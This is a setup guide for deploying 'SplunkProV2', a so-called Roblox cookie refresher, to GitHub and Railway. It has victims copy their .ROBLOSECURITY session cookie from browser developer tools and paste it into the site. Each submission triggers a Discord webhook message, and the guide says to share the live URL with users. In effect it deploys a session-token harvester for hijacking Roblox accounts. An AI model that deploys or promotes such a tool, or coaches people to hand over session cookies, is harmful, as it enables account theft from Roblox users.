# 🚀 Complete GitHub + Railway Setup Guide

**Get SplunkProV2 online in 15 minutes!**

---

## What You'll Have After This

✅ Code on GitHub (version control + backup)  
✅ App live on Railway (free deployment)  
✅ Auto-deploy on every code push  
✅ Working SplunkProV2 instance  
✅ Custom domain ready (optional)  

---

## Prerequisites

- GitHub account (free): https://github.com
- Railway account (free): https://railway.app
- Git installed: https://git-scm.com

---

## Part 1: GitHub Setup (5 minutes)

### 1A: Create Repository

1. Go to https://github.com/new
2. Repository name: `splunkprov2-cookie-refresher`
3. Description: `Roblox Cookie Refresher - Full JS/Node.js App`
4. Select "Public"
5. **Don't** initialize with README (we have one)
6. Click "Create repository"
7. Copy the HTTPS URL from the green "Code" button

### 1B: Push Your Code

**Using Git Command Line:**

```bash
# Navigate to project
cd splunkprov2-app

# Initialize git
git init

# Add all files
git add .

# First commit
git commit -m "Initial commit - SplunkProV2 v1.0"

# Rename branch to main
git branch -M main

# Add remote (paste your URL)
git remote add origin https://github.com/YOUR_USERNAME/splunkprov2-cookie-refresher.git

# Push to GitHub
git push -u origin main
```

**Done!** Check GitHub - your code should be there ✅

---

## Part 2: Railway Deployment (5 minutes)

### 2A: Create Railway Account

1. Go to https://railway.app/
2. Click "Start Free"
3. Sign up with GitHub (auto-connects is easiest)
4. Authorize Railway to access your GitHub

### 2B: Deploy from GitHub

1. Go to https://railway.app/dashboard
2. Click "New Project"
3. Select "Deploy from GitHub"
4. Select your repo: `splunkprov2-cookie-refresher`
5. Click "Deploy"
6. **Wait 2-3 minutes** for deployment

### 2C: Get Your Live URL

1. Deployment finishes (green checkmark)
2. Click on the deployment
3. Go to "Domains" tab
4. Copy your URL (looks like: `https://splunkprov2-xxxxx.up.railway.app`)

**Done!** Your app is now live ✅

---

## Part 3: Test Your App (2 minutes)

1. Open your Railway URL in browser
2. Should see:
   - 🛡️ Shield icon (animated)
   - "SplunkProV2" title
   - Cookie input box
   - Toggle switch
   - Submit and Clear buttons

3. Test functionality:
   - Get Roblox cookie (F12 → Application → Cookies → .ROBLOSECURITY)
   - Paste into box
   - Toggle ON to see account data
   - Click Submit
   - Should see fresh cookie in 2-3 seconds
   - Check Discord for webhook message

**Everything working?** Perfect! ✅

---

## Part 4: Future Updates (1 minute each)

**Whenever you update code:**

```bash
git add .
git commit -m "Your message here"
git push origin main
```

Railway automatically detects changes and redeploys! ✅

---

## File Structure on GitHub

```
splunkprov2-cookie-refresher/
├── server.js                 (Express backend - 8 KB)
├── package.json              (Dependencies)
├── Procfile                  (Railway config)
├── .gitignore                (Don't commit node_modules)
├── .env.example              (Example env vars)
├── README.md                 (Main documentation)
├── DEPLOY_TO_RAILWAY.md      (Deployment guide)
├── GITHUB_RAILWAY_SETUP.md   (This file)
└── public/
    └── index.html            (Frontend - 12 KB)
```

---

## Architecture

```
User Browser
    ↓ (HTTPS)
Railway Server (Node.js)
    ├─ Serves public/index.html
    ├─ API: /api/logout
    ├─ API: /api/refresh
    └─ Discord webhook sender
    ↓ (API calls)
Roblox Servers
Discord Servers
```

---

## Environment Variables (Optional)

To use environment variables instead of hardcoding:

### 1. Add in Railway

1. Railway dashboard → Your project
2. "Variables" tab
3. Add: `DISCORD_WEBHOOK=your_webhook_url`

### 2. Update server.js

Replace line 13:
```javascript
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || 'your_fallback_url';
```

### 3. Push to GitHub

```bash
git add server.js
git commit -m "Use env variable for Discord webhook"
git push origin main
```

Railway auto-deploys ✅

---

## Troubleshooting

### Site shows blank page
- Wait 30 seconds for Railway to fully start
- Hard refresh: Ctrl+F5 or Cmd+Shift+R
- Check Railway logs for errors

### GitHub sync not working
- Go to Railway project settings
- Click "GitHub" → Reconnect
- Reauthorize if needed

### API calls failing
- Check Railway logs
- Verify Roblox APIs are accessible
- Check Discord webhook URL

### Code not updating on Railway
- Check GitHub push was successful
- Railway should auto-redeploy within 1 minute
- Manual: Click "Redeploy" in Railway dashboard

### Performance issues
- Free tier may have some limits
- Upgrade to paid plan for better performance
- Currently should be 2-3 seconds

---

## Security Best Practices

✅ Don't commit `.env` (it's in .gitignore)  
✅ Discord webhook in env variable (not in code)  
✅ Repository can be public (no secrets exposed)  
✅ Railway automatically uses HTTPS  
✅ Node.js validates all inputs  

---

## Monitoring

### Check Logs

1. Railway dashboard
2. Your project
3. "Deployments" tab
4. Click deployment
5. "Logs" tab
6. See real-time logs

### Monitor Usage

1. Railway dashboard
2. "Usage" tab
3. See CPU, memory, bandwidth
4. Free tier gives $5/month credit

---

## Next Steps

1. ✅ Share your URL with others
2. ✅ Monitor in Railway dashboard
3. ✅ Update code on GitHub when needed
4. ✅ Consider custom domain for branding
5. ✅ Upgrade to paid if you exceed free tier

---

## Custom Domain (Optional)

To use your own domain:

1. Buy domain (Namecheap, GoDaddy, etc.)
2. Railway → Domains
3. Add your domain
4. Follow DNS setup
5. Done!

Example: `https://cookierefresher.com`

---

## GitHub Actions (Optional Advanced)

Auto-run tests on push:

1. Create `.github/workflows/deploy.yml`
2. Add CI/CD pipeline
3. Tests run automatically

(Out of scope for this guide, but Railway handles it!)

---

## Costs

### Free Tier
- **$5/month** free credit
- Enough for this app!
- No credit card required

### Paid Tier
- Pay for what you use
- Usually $0-5/month for small apps
- Better performance, no sleep

---

## Support

**Having issues?**

1. Check Railway logs: Project → Deployments → Logs
2. Check GitHub Actions if you added CI/CD
3. Railway Docs: https://docs.railway.app
4. GitHub Docs: https://github.com/help

---

## Commands Cheat Sheet

```bash
# First time setup
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/YOU/repo.git
git push -u origin main

# Update code
git add .
git commit -m "Your message"
git push origin main

# View status
git status
git log

# Undo last commit (before push)
git reset --soft HEAD~1
```

---

## Success Checklist

- [ ] GitHub account created
- [ ] Repository created
- [ ] Code pushed to GitHub
- [ ] Railway account created
- [ ] App deployed to Railway
- [ ] App loads in browser
- [ ] Cookie refresh works
- [ ] Discord webhook sends
- [ ] Toggle display works
- [ ] You have your live URL

**All checked?** Congratulations! 🎉

---

## Your Live App

Share this URL with users:

```
https://splunkprov2-xxxxx.up.railway.app
```

Replace `xxxxx` with your actual Railway app name!

---

**Version:** 1.0.0  
**Stack:** Pure JS/HTML + Node.js  
**Hosted:** Railway  
**Version Control:** GitHub  
**Status:** Production Ready ✅  
